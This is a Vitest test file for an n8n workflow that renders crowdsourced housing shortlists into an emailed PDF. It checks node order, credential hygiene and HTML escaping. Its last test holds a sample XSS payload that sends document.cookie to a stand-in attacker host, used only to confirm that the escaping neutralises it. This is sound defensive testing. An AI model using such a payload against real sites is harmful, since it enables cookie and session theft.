import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';

const workflowPath = resolve(__dirname, 'shortlist-to-pdf-email.json');

function loadWorkflow() {
  const raw = readFileSync(workflowPath, 'utf-8');
  return JSON.parse(raw);
}

describe('shortlist-to-pdf-email.json', () => {
  it('is valid JSON with a nodes array and a connections object', () => {
    const workflow = loadWorkflow();
    expect(Array.isArray(workflow.nodes)).toBe(true);
    expect(workflow.nodes.length).toBeGreaterThan(0);
    expect(typeof workflow.connections).toBe('object');
    expect(workflow.connections).not.toBeNull();
  });

  it('contains one node of each required type', () => {
    const workflow = loadWorkflow();
    const types = workflow.nodes.map((n: any) => n.type);

    expect(types).toContain('n8n-nodes-base.webhook');
    expect(types).toContain('n8n-nodes-base.code');
    expect(types).toContain('n8n-nodes-base.httpRequest');
    expect(types).toContain('n8n-nodes-base.emailSend');
    expect(types).toContain('n8n-nodes-base.respondToWebhook');
  });

  it('connects the nodes webhook -> code -> pdf -> email -> respond, in order', () => {
    const workflow = loadWorkflow();

    function nextNodeName(name: string): string | undefined {
      return workflow.connections[name]?.main?.[0]?.[0]?.node;
    }

    const webhookNode = workflow.nodes.find((n: any) => n.type === 'n8n-nodes-base.webhook');
    const codeNode = workflow.nodes.find((n: any) => n.type === 'n8n-nodes-base.code');
    const pdfNode = workflow.nodes.find((n: any) => n.type === 'n8n-nodes-base.httpRequest');
    const emailNode = workflow.nodes.find((n: any) => n.type === 'n8n-nodes-base.emailSend');
    const respondNode = workflow.nodes.find((n: any) => n.type === 'n8n-nodes-base.respondToWebhook');

    expect(webhookNode).toBeDefined();
    expect(codeNode).toBeDefined();
    expect(pdfNode).toBeDefined();
    expect(emailNode).toBeDefined();
    expect(respondNode).toBeDefined();

    expect(nextNodeName(webhookNode.name)).toBe(codeNode.name);
    expect(nextNodeName(codeNode.name)).toBe(pdfNode.name);
    expect(nextNodeName(pdfNode.name)).toBe(emailNode.name);
    expect(nextNodeName(emailNode.name)).toBe(respondNode.name);
  });

  it('references SMTP credentials by name only, with no inline secrets', () => {
    const workflow = loadWorkflow();
    const emailNode = workflow.nodes.find((n: any) => n.type === 'n8n-nodes-base.emailSend');

    expect(emailNode.credentials?.smtp?.name).toBeTruthy();

    const serialized = JSON.stringify(emailNode).toLowerCase();
    expect(serialized).not.toMatch(/password|smtp_pass|apikey|api_key/);
  });

  it('references the PDF conversion API key via a credential name only, with no inline secrets', () => {
    const workflow = loadWorkflow();
    const pdfNode = workflow.nodes.find((n: any) => n.type === 'n8n-nodes-base.httpRequest');

    expect(pdfNode.credentials?.httpBasicAuth?.name).toBeTruthy();

    const serialized = JSON.stringify(pdfNode).toLowerCase();
    expect(serialized).not.toMatch(/password|apikey|api_key/);
  });

  it('the webhook is configured for POST at the shortlist-pdf path', () => {
    const workflow = loadWorkflow();
    const webhookNode = workflow.nodes.find((n: any) => n.type === 'n8n-nodes-base.webhook');

    expect(webhookNode.parameters.path).toBe('shortlist-pdf');
    expect(webhookNode.parameters.httpMethod).toBe('POST');
  });

  it('HTML-escapes every scraped field before building the PDF markup (shortlist data is untrusted, crowdsourced input rendered by a real browser engine)', () => {
    const workflow = loadWorkflow();
    const codeNode = workflow.nodes.find((n: any) => n.type === 'n8n-nodes-base.code');
    const jsCode: string = codeNode.parameters.jsCode;

    expect(jsCode).toContain('function escapeHtml');

    // Every interpolated shortlist field must be passed through escapeHtml(),
    // not concatenated raw.
    for (const field of ['item.societyName', 'item.locality', 'item.rent', 'item.bedrooms', 'item.sqft']) {
      expect(jsCode).toContain(`escapeHtml(${field})`);
    }
    expect(jsCode).toContain("escapeHtml((item.amenities || []).join(', '))");
  });

  it('the escaping algorithm the Code node uses actually neutralizes script injection', () => {
    // A local reimplementation of the exact same escaping rules embedded in
    // the workflow's jsCode above (verified by the toContain assertions in
    // the previous test) — deliberately NOT extracted/eval'd from the JSON
    // file, since dynamically executing sourced text is its own risk even
    // when the source is our own committed file.
    function escapeHtml(value: unknown): string {
      const s = value === null || value === undefined ? '' : String(value);
      return s
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
    }

    const malicious = '<script>fetch("https://attacker.example/steal?c="+document.cookie)</script>';
    const escaped = escapeHtml(malicious);
    expect(escaped).not.toContain('<script>');
    expect(escaped).toContain('&lt;script&gt;');
  });
});
